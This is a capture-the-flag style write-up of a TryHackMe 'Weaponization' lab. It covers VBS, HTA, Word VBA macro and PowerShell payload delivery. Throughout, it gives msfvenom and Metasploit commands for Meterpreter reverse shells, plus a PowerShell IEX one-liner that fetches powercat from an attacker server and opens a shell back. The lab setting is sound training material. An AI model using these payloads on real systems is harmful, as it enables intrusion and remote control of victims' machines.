### Windows Scripting Host - WSH

1. Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.

   I tried the message box using cscript which seemed to work.
   
   ![Hello](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_Hello.png)

   When trying the open cmd.exe with the vbs file, I ran into an issue where it just wouldn't open a command prompt. So I had to modify the code slightly for it to work.
   
   ```cmd
   Set shell = WScript.CreateObject("Wscript.Shell")
   shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
   ```
   
   ![CMB VBS](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_CMD_VBS.png)
   
   It also worked when saving the vbs file as a text file and using the `/e` argument.
   
   ```cmd
   cscript /e:VBScript c:\Users\thm\Desktop\payload.txt
   ```

### An HTML Application - HTA

1. Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.

   This task can also be done with the regulat Windows 10 machine. Saves me from terminating and started a new machine. First we open MetaSploit and the required module.
   
   ```cmd
   use exploit/windows/misc/hta_server
   ```
   
   Then we set all required options.
   
   ```cmd
   set LHOST 10.18.78.136
   set LPORT 1337
   set payload windows/meterpreter/reverse_tcp
   exploit
   ```
   
   ![Metasploit Module Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_HTA_Metasploit_Module_Run.png)
   
   As seen in the image above, we managed to get a reverse connection back.

### Visual Basic for Application - VBA

1. Now replicate and apply what we discussed to get a reverse shell!

   First I had to create a vba payload using msfvenom.
   
   ```cmd
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f vba 
   ```
   
   Now I could copy this macro into a Word document on the target machine.
   
   ![Macro](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_VBA_Macro.png)
   
   Save it as a word 97 document so the macros are enabled. Close Word.
   
   Instead of using `nc` I used Metasploit as a handler.
   
   ```cmd
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 10.18.78.136
   set LPORT 1337
   run
   ```
   
   Now we can open the newly created Word document with our payload inside.

### PowerShell - PSH

1. Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks! 

   First thing to do is to download the Powercat tool from Github.
   
   ```cmd
   git clone https://github.com/besimorhino/powercat.git
   ```
   
   ![Git Clone](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Git_Clone.png)
   
   Next we set up a server in the Powercat folder and a listener on the specified port.
   
   ```cmd
   cd Weaponization
   python3 -m http.server 8080 
   
   sudo nc -nlvp 1337
   ```
   
   Then we can download and execute Powercat from our target machine using PowerShell.
   
   ```cmd
   powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.18.78.136:8080/powercat.ps1');powercat -c 10.18.78.136 -p 1337 -e cmd"
   ```

### Delivery Techniques

1. Which method is used to distribute payloads to a victim at social events?

   This is mentioned in the text. Usually a physical device would be used as this can be handed over.

### Practice Arena 

In this task we will use what we have learned and try to gain access to the target machine with one (or more) of the methods.

1. What is the flag? Hint: Check the user desktop folder for the flag! 

   For this task I decided to use the HTML Application method. First step is to create a payload using msfvenom.
   
   ```cmd
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f hta-psh -o letmein.hta
   ```
   
   ![Payload Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Payload_Creation.png)
   
   Then we need to setup a listener, which we can do with MetaSploit. Don't forget to set the required options.
   
   ```cmd
   use exploit/multi/handler
   
   set LHOST 10.18.78.136
   set LPORT 1337
   set payload windows/meterpreter/reverse_tcp
   ```
   
   ![Metasploit Handler](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Metasploit_Handler.png)
   
   Lastly, we need to setup a server in the same folder as the payload.
   
   ```cmd
   python3 -m http.server 8080
   ```
   
   Now we can navigate to the web application and supply the url provided by the MetaSploit handler.
   
   ![Web Application](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Web_Application.png)
   
   We can see we successfully captured the reverse connection in MetaSploit. Although maybe not necessary when using this method, I also wanted to migrate our process to another. For this we can use the following command in MetaSploit:
   
   ```cmd
   run post/windows/manage/migrate
   ```
   
   ![Migrate Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Migrate_Check.png)
   
   Finally, we can look for the flag on the system.
